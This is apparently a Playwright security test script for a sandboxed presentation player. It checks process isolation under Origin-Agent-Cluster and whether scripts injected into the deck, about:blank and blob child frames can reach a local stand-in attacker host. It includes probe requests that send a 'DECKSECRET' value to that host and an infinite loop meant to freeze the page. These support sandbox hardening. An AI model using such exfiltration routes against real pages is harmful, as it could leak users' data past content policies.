// Leftovers: (1) can Origin-Agent-Cluster from the worker give a same-site player its own process? (2) do uncontrolled child realms bypass worker mediation for an allow-listed host?
const L = require('./lib.cjs'); const fs = require('node:fs'); const H = require('./hostile/battery.js'); const EVIL = 'http://127.0.0.2:4630'; const PLAYER = 'http://127.0.0.1:4622';
const CDNCSP = `default-src 'self' 'unsafe-inline' 'unsafe-eval' data: blob:; script-src 'self' 'unsafe-inline' 'unsafe-eval' blob: ${EVIL}; style-src 'self' 'unsafe-inline' ${EVIL}; connect-src 'self'; frame-src 'self' data: blob:; object-src 'none'`;
(async () => {
  const app = await L.startStatic(4620, L.DIR + '/app'); const player = await L.startStatic(4622, L.DIR + '/player2'); const evil = await L.startEvil(4630); const browser = await L.realLaunch(); const out = {};
  try {
    for (const [name, headers] of [['same-site, no header', { 'Cache-Control': 'no-store' }], ['same-site, Origin-Agent-Cluster: ?1 on deck responses', { 'Origin-Agent-Cluster': '?1' }]]) {
      const context = await browser.newContext(); const page = await context.newPage(); await page.goto(`http://127.0.0.1:4620/app.html?player=${encodeURIComponent(PLAYER)}`); await page.evaluate((x) => window.openV2(x), { files: H.files, headers });
      const frame = page.frames().find((f) => f.url().includes('/vfs/')); const r = { originAgentCluster: await frame.evaluate(() => window.originAgentCluster), targets: (await L.targets(browser)).targets.filter((t) => !t.startsWith('service_worker')) };
      await frame.evaluate(() => { setTimeout(() => { for (;;) {} }, 200); }); await L.sleep(700);
      const raf = await L.withTimeout(page.evaluate(() => new Promise((res) => { window.__raf.length = 0; setTimeout(() => res(window.__raf.length), 1000); })), 4000); r.appFramesIn1sDuringDeckLoop = raf.value; out[name] = r; await Promise.race([context.close(), L.sleep(3000)]);
    }
    for (const [name, opts] of [['allow-listed host + worker mediation', { headers: { 'Content-Security-Policy': CDNCSP }, mediate: true }], ['fixed offline policy', { policy: 'offline' }]]) {
      const context = await browser.newContext(); const page = await context.newPage(); await page.goto(`http://localhost:4620/app.html?player=${encodeURIComponent(PLAYER)}&fsrc=1`); await page.evaluate((x) => window.openV2(x), { files: H.files, ...opts }); const frame = page.frames().find((f) => f.url().includes('/vfs/')); const run = 'q7-' + name.slice(0, 5);
      const r = await frame.evaluate(async (c) => { const res = {}; const viaDoc = (doc, tag) => new Promise((done) => { const s = doc.createElement('script'); s.src = `${c.evil}/x.js?c=${tag}&run=${c.run}&leak=DECKSECRET`; s.onload = () => done('load'); s.onerror = () => done('error'); doc.head.append(s); setTimeout(() => done('no event'), 1500); });
        res.scriptInDeckDocument = await viaDoc(document, 'script-deck-doc'); const f = document.createElement('iframe'); document.body.append(f); res.scriptInAboutBlankChild = await viaDoc(f.contentDocument, 'script-about-blank-child');
        const b = document.createElement('iframe'); b.src = URL.createObjectURL(new Blob(['<!doctype html><head></head><body>b</body>'], { type: 'text/html' })); await new Promise((d) => { b.onload = d; document.body.append(b); }); res.scriptInBlobChild = await viaDoc(b.contentDocument, 'script-blob-child'); return res; }, { evil: EVIL, run }).catch((e) => 'ERR ' + e.message.split('\n')[0]);
      await L.sleep(1000); out[name] = { results: r, attackerGot: evil.log.filter((l) => l.run === run).map((l) => l.c) }; await context.close();
    }
  } catch (e) { out.error = String(e.stack).slice(0, 400); }
  finally { await Promise.race([browser.close(), L.sleep(5000)]); for (const s of [app, player, evil]) await s.close(); }
  fs.writeFileSync(`${L.DIR}/out/q7.json`, JSON.stringify(out, null, 1)); console.log(JSON.stringify(out, null, 1));
})();
